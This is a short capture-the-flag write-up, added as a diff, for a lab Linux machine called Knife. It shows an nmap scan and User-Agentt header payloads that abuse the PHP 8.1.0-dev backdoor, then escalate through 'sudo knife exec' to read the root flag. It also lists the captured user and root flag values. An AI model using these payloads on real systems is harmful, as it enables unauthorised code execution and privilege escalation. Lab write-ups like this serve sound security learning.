@@ -1,0 +1,27 @@
+MACHINE NAME : KNIFE
+OS : LINUX
+IP : 10.10.10.242
+NMAP SCAN : nmap -v -A -sC -Pn -oN Nmap_knife.txt 10.10.10.242 
+THAN SCANNED WITH BURPSUITE AND GET THIS WHICH LOOK SUSPECIOUS : PHP 8.1.0-dev ITS DEVELOPER VERSION SO IT SHOULD HAVE VULNERABILITY, SOME DIGGING I GOT {PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution (RCE)}
+ 
+ THAN THE FOLLOWING STEPS ON SCREENSHOT BELOW :
+ STEP 1 : Knife_Burp.png
+ 
+ 
+ STEP 2 : Knife_userflag.png 
+userflag bb80fcfe4889b7a9f6912204151e7331
+
+
+THAN SEARCH THIS DOCUMANTATION ON KNIFE
+https://docs.chef.io/workstation/knife_exec/
+
+
+FOUND THAT RUBY BASED CMD FOR ROOT ACCESS
+User-Agentt: zerodiumsystem("sudo knife exec -E \"system('whoami')\"");
+
+
+AFTER THIS :
+User-Agentt: zerodiumsystem("sudo knife exec -E \"system('cat /root/root.txt')\"");
+
+ STEP 3 : root_flag.png
+root flag : 1977595ddd93999717cefaabe09afcae
